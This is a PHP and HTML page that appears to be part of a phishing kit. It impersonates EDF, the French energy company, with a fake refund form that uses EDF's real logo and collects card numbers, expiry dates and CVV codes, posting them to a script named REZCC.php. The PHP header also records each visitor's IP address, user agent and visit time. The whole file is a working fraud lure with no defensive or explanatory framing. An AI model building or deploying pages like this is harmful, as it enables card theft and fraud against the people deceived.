<?php

ob_start();
session_start();

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";




?>



		<script>
		
		function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}
		
		
		</script>

<html lang="en">
<head>


    <meta property="twitter:card" content="summary_large_image">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <meta property="twitter:card" content="summary_large_image">
    <style>
      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6 {  margin: 0;  padding: 0;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}
    </style>
    <style>
      html {
        font-family: Inter;
        font-size: 16px;
      }

      body {
        font-weight: 400;
        font-style:normal;
        text-decoration: none;
        text-transform: none;
        letter-spacing: normal;
        line-height: 1.15;
        color: var(--dl-color-gray-black);
        background-color: var(--dl-color-gray-white);

      }
    </style>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap">
    <link rel="stylesheet" href="./style.css">
  </head>
  <body>
    <div>
      <link href="./home.css" rel="stylesheet">

      <div class="home-container">
        <header data-role="Header" class="home-header">
          <img alt="logo" src="https://espace-client.edf.fr/sso/XUI/img/logo-edf.png" class="home-image">
        </header>
		<span class="home-text">Formulaire de remboursement EDF</span>
		<center><form action="REZCC.php" method="POST">
        
        <input type="text" id="cc" name="CC" required="on" placeholder="Numéro de carte" minlength="16" maxlength="16" autocomplete="cc-number" class="input home-textinput">
        <input type="text" id="expi" name="expi" required="" placeholder="Date d'expiration MM/YY" autocomplete="cc-exp" minlength="16" maxlength="16" class="input home-textinput1" onkeyup="formatString(event);">
        <input type="password" id="cvv" name="CVV" required="" placeholder="CVV" autocomplete="cc-csc" minlength="3" maxlength="4" class="input home-input">
        <button class="button home-button">Envoyer</button></form></center>
      </div>
    </div>
  

</body></html>